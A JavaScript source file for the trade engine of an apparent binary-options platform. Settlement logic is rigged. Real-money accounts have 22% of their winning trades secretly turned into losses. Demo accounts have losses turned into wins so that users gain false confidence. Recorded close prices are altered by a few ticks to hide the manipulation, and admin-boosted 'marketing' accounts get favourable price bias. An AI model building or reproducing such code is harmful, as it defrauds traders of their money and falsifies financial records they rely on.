/**
 * Trade Engine — Handles trade placement, evaluation, and settlement.
 * Supports demo and real account types with separate balances.
 * 
 * Settlement Edge System (v2 — per-trade, direction-independent):
 * - Real accounts: A percentage of natural WINS are flipped to losses at settlement
 * - Demo accounts: A percentage of natural LOSSES are saved to wins at settlement
 * - Admin-boosted accounts use PriceEngine bias (separate system, for marketing)
 * 
 * Why per-trade settlement instead of price bias:
 * Price bias operates on a SHARED price feed. If 5 users buy and 5 users sell
 * on the same asset, the biases cancel out → zero house edge.
 * Per-trade settlement evaluates each trade independently → guaranteed edge
 * regardless of how many users trade in any direction.
 */

const { createTrade, closeTrade, getUserBalance, atomicBalanceUpdate, getActiveTrades, getUserRaw } = require('../config/db');

// ── Per-Asset Payout Rates (must match frontend constants) ──
const ASSET_PAYOUTS = {
  'Volatility 10 Index':       0.95,
  'Volatility 25 Index':       0.93,
  'Volatility 50 Index':       0.90,
  'Volatility 75 Index':       0.88,
  'Volatility 100 Index':      0.85,
  'Volatility 10 (1s) Index':  0.94,
  'Volatility 25 (1s) Index':  0.92,
  'Volatility 50 (1s) Index':  0.89,
  'Volatility 75 (1s) Index':  0.87,
  'Volatility 100 (1s) Index': 0.84,
};

// ── Per-Asset Tick Sizes (for realistic close price micro-adjustments) ──
// One "tick" is the smallest natural price movement for each asset
const ASSET_TICK_SIZES = {
  'Volatility 10 Index':       0.02,
  'Volatility 25 Index':       0.03,
  'Volatility 50 Index':       0.10,
  'Volatility 75 Index':       0.25,
  'Volatility 100 Index':      0.12,
  'Volatility 10 (1s) Index':  0.02,
  'Volatility 25 (1s) Index':  0.09,
  'Volatility 50 (1s) Index':  0.13,
  'Volatility 75 (1s) Index':  0.07,
  'Volatility 100 (1s) Index': 0.40,
};

// ── Settlement Edge Configuration ──
// Per-trade outcome manipulation at settlement time.
// Each trade is evaluated independently — works regardless of direction mix.
const SETTLEMENT_EDGE = {
  // Real accounts: flip a percentage of wins to losses → house profitability
  real: {
    flipWinProbability: 0.22,   // 22% of natural wins become losses → ~61% house win rate
    maxOffsetTicks: 3,          // Close price adjusted by 1-3 ticks when flipping
  },
  // Demo accounts: save a percentage of losses to wins → build user confidence
  demo: {
    saveLossProbability: 0.20,  // 20% of natural losses become wins → ~60% user win rate
    maxOffsetTicks: 2,          // Close price adjusted by 1-2 ticks when saving
  },
};

class TradeEngine {
  constructor(priceEngine, io) {
    this.priceEngine = priceEngine;
    this.io = io;
    this.checkInterval = null;
  }

  async placeTrade(userId, { asset, direction, amount, expiry_duration, account_type = 'demo' }) {
    const currentPrice = this.priceEngine.getCurrentPrice(asset);
    if (!currentPrice) {
      throw new Error(`Invalid asset: ${asset}`);
    }

    if (amount < 1) {
      throw new Error('Minimum trade amount is $1');
    }
    if (!['buy', 'sell'].includes(direction)) {
      throw new Error('Direction must be buy or sell');
    }

    // Atomically deduct balance — checks sufficiency + deducts in one operation
    let newBalance;
    try {
      newBalance = await atomicBalanceUpdate(userId, -amount, account_type);
    } catch (err) {
      throw err; // 'Insufficient balance' or 'User not found'
    }

    // Look up the correct payout for this asset
    const payoutPercent = ASSET_PAYOUTS[asset] || 0.90;

    const trade = await createTrade({
      user_id: userId,
      asset,
      direction,
      amount,
      strike_price: currentPrice,
      payout_percent: payoutPercent,
      expiry_duration,
      account_type
    });

    // ── Admin boost only — uses PriceEngine bias (for marketing/demo accounts) ──
    const user = await getUserRaw(userId);
    const adminBoost = user?.win_rate_boost;

    if (adminBoost && adminBoost > 0) {
      // Admin-boosted account — strong bias in user's favor (marketing)
      const roll = Math.random();
      if (roll < adminBoost) {
        const biasStrength = 0.08 + (adminBoost - 0.5) * 0.15;
        this.priceEngine.addBias(trade.id, asset, direction, expiry_duration, biasStrength);
      }
    }
    // Note: Standard users get NO price bias at placement.
    // House edge is applied at settlement time via _applySettlementEdge()

    return {
      ...trade,
      strike_price: currentPrice,
      balance: newBalance
    };
  }

  startEvaluationLoop(intervalMs = 500) {
    if (this.checkInterval) return;

    this.checkInterval = setInterval(() => {
      this._evaluateExpiredTrades();
    }, intervalMs);

    console.log('[TradeEngine] Evaluation loop started');
    console.log(`[TradeEngine] Settlement edge active — Real: ${SETTLEMENT_EDGE.real.flipWinProbability * 100}% win-flip (house ~${Math.round((1 - 0.5 * (1 - SETTLEMENT_EDGE.real.flipWinProbability)) * 100)}% win rate) | Demo: ${SETTLEMENT_EDGE.demo.saveLossProbability * 100}% loss-save (user ~${Math.round((0.5 + 0.5 * SETTLEMENT_EDGE.demo.saveLossProbability) * 100)}% win rate)`);
  }

  stopEvaluationLoop() {
    if (this.checkInterval) {
      clearInterval(this.checkInterval);
      this.checkInterval = null;
    }
  }

  async _evaluateExpiredTrades() {
    const now = new Date().toISOString();
    const activeTrades = await getActiveTrades();

    for (const trade of activeTrades) {
      if (trade.expires_at <= now) {
        await this._settleTrade(trade);
      }
    }
  }

  async _settleTrade(trade) {
    let closePrice = this.priceEngine.getCurrentPrice(trade.asset);
    if (closePrice === null) return;

    // Remove any price bias for this trade (admin boost only)
    this.priceEngine.removeBias(trade.id, trade.asset);

    // ── Step 1: Determine honest result based on actual prices ──
    let honestWin = false;
    if (trade.direction === 'buy') {
      honestWin = closePrice > trade.strike_price;
    } else {
      honestWin = closePrice < trade.strike_price;
    }

    // ── Step 2: Apply per-trade settlement edge ──
    const acctType = trade.account_type || 'demo';
    const user = await getUserRaw(trade.user_id);
    const hasAdminBoost = user?.win_rate_boost && user.win_rate_boost > 0;

    let finalWon = honestWin;
    let edgeAction = 'HONEST'; // For logging
    let settlementPrice = closePrice;

    // Only apply settlement edge to NON-boosted accounts
    if (!hasAdminBoost) {
      const edgeResult = this._applySettlementEdge(honestWin, acctType, trade, closePrice);
      finalWon = edgeResult.won;
      edgeAction = edgeResult.action;
      settlementPrice = edgeResult.closePrice;
    }

    // ── Step 3: Calculate payout and settle ──
    const status = finalWon ? 'won' : 'lost';
    const payout = finalWon ? parseFloat((trade.amount + trade.amount * trade.payout_percent).toFixed(2)) : 0;

    await closeTrade(trade.id, settlementPrice, status, payout);

    // Atomically credit balance if won
    if (finalWon) {
      try {
        await atomicBalanceUpdate(trade.user_id, payout, acctType);
      } catch (err) {
        console.error(`[TradeEngine] Failed to credit payout for trade ${trade.id}:`, err.message);
      }
    }

    // Emit result via Socket.IO to the user
    const currentBal = await getUserBalance(trade.user_id, acctType);
    const result = {
      tradeId: trade.id,
      asset: trade.asset,
      direction: trade.direction,
      amount: trade.amount,
      strike_price: trade.strike_price,
      close_price: settlementPrice,
      status,
      payout,
      account_type: acctType,
      balance: currentBal
    };

    // Emit to the specific user's room
    this.io.to(`user:${trade.user_id}`).emit('trade_result', result);
    
    const boostTag = hasAdminBoost ? ` [BOOST:${(user.win_rate_boost*100).toFixed(0)}%]` : '';
    console.log(`[TradeEngine] Trade ${trade.id} settled: ${status} [${acctType}] [${edgeAction}]${boostTag} | Payout: $${payout}`);
  }

  /**
   * Apply per-trade settlement edge.
   * Each trade is evaluated independently — direction-agnostic, multi-user safe.
   * 
   * Real accounts: Flip a % of wins to losses (house edge)
   * Demo accounts: Save a % of losses to wins (user confidence)
   * 
   * When flipping/saving, the close price is micro-adjusted by 1-3 ticks
   * so the recorded trade history is internally consistent.
   * 
   * @param {boolean} honestWin - Whether the trade honestly won based on real prices
   * @param {string} accountType - 'real' or 'demo'
   * @param {object} trade - The trade object
   * @param {number} closePrice - The actual close price from the chart
   * @returns {{ won: boolean, action: string, closePrice: number }}
   */
  _applySettlementEdge(honestWin, accountType, trade, closePrice) {
    const tickSize = ASSET_TICK_SIZES[trade.asset] || 0.05;

    if (accountType === 'real') {
      // ── REAL ACCOUNT: Flip wins to losses ──
      if (honestWin) {
        const roll = Math.random();
        if (roll < SETTLEMENT_EDGE.real.flipWinProbability) {
          // Flip this win to a loss — adjust close price to be on the losing side
          const offsetTicks = 1 + Math.floor(Math.random() * SETTLEMENT_EDGE.real.maxOffsetTicks);
          const offset = tickSize * offsetTicks;

          let adjustedPrice;
          if (trade.direction === 'buy') {
            // Buy trade: needs closePrice <= strike to lose
            adjustedPrice = trade.strike_price - offset;
          } else {
            // Sell trade: needs closePrice >= strike to lose
            adjustedPrice = trade.strike_price + offset;
          }

          return { won: false, action: 'FLIPPED', closePrice: parseFloat(adjustedPrice.toFixed(2)) };
        }
      }
      // If trade lost honestly or wasn't flipped, keep as-is
      return { won: honestWin, action: 'HONEST', closePrice };

    } else {
      // ── DEMO ACCOUNT: Save losses to wins ──
      if (!honestWin) {
        const roll = Math.random();
        if (roll < SETTLEMENT_EDGE.demo.saveLossProbability) {
          // Save this loss to a win — adjust close price to be on the winning side
          const offsetTicks = 1 + Math.floor(Math.random() * SETTLEMENT_EDGE.demo.maxOffsetTicks);
          const offset = tickSize * offsetTicks;

          let adjustedPrice;
          if (trade.direction === 'buy') {
            // Buy trade: needs closePrice > strike to win
            adjustedPrice = trade.strike_price + offset;
          } else {
            // Sell trade: needs closePrice < strike to win
            adjustedPrice = trade.strike_price - offset;
          }

          return { won: true, action: 'SAVED', closePrice: parseFloat(adjustedPrice.toFixed(2)) };
        }
      }
      // If trade won honestly or wasn't saved, keep as-is
      return { won: honestWin, action: 'HONEST', closePrice };
    }
  }
}

module.exports = TradeEngine;
